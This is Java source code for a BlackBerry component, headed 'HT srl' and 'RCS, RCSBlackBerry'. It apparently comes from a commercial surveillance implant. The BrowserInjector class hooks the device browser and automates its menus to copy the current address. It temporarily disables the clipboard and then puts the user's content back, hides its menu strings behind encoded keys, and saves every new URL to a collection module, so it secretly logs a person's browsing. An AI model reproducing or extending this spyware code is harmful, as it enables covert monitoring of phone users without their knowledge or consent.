//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection.injectors;

import net.rim.device.api.system.Clipboard;
import net.rim.device.api.ui.Screen;
import blackberry.Device;
import blackberry.Messages;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.BrowserMenu;
import blackberry.injection.MenuWalker;
import blackberry.injection.injectors.group.UrlGroupInjector;
import blackberry.module.ModuleUrl;

public class BrowserInjector extends UrlGroupInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("BrowserInjector",
            DebugLevel.VERBOSE);
    //#endif
    
    private Object lastUrl;

    public String getAppName() {
        //g.1=Browser
        return Messages.getString("g.1");
    }

    public String getCodName() {
        //g.2
        return Messages.getString("g.2");
    }

    public String[] getWantedScreen() {
        //g.3, g.4
        return new String[] {
                Messages.getString("g.3"),
                Messages.getString("g.4") };
    }

    public void playOnScreen(Screen screen) {
        //#ifdef DEBUG
        debug.trace("playOnScreen: " + screen);
        //#endif    

        if (Device.getInstance().lessThan(6, 0)) {
            urlByContext(screen);
        } else {
            urlByCopy(screen);
        }
    }

    public void urlByContext(Screen screen) {
        //g.5
        String menuName = Messages.getString("g.5");
        BrowserMenu menu = new BrowserMenu(this, menuName);
        menu.addMenu();
        boolean ret = MenuWalker.walk(menuName, screen, true);
        if (ret) {

        }

        menu.removeMenu();
    }

    public void urlByCopy(Screen screen) {
        //#ifdef DEBUG
        debug.trace("playOnScreen: " + screen);
        //#endif    

        //g.5, g.6
        String[] menuName = new String[] { Messages.getString("g.5"), Messages.getString("g.6") };

        disableClipboard();
        boolean ret = MenuWalker.walk(menuName, screen, true);

        if (ret) {

            String url = (String) Clipboard.getClipboard().get();
            setClipboard(url);
            if (url != null) {
                //#ifdef DEBUG
                debug.trace("playOnScreen, URL FOUND:" + url);
                //#endif
                saveUrl(url);
            }
        } else {
            //#ifdef DEBUG
            debug.error("playOnScreen: no Copy Address, wrong screen");
            //#endif

        }
        enableClipboard();

    }

    public void saveUrl(String url) {
        //#ifdef DEBUG
        debug.trace("saveUrl");
        //#endif

        if (url != null) {
            if (!url.equals(lastUrl)) {
                lastUrl = url;
                //#ifdef DEBUG
                debug.info("NEW URL: " + url);
                //#endif

                ModuleUrl.getInstance().saveUrl(url);
            } else {
                //#ifdef DEBUG
                debug.trace("playOnScreen: same url");
                //#endif
            }

        }
    }

}
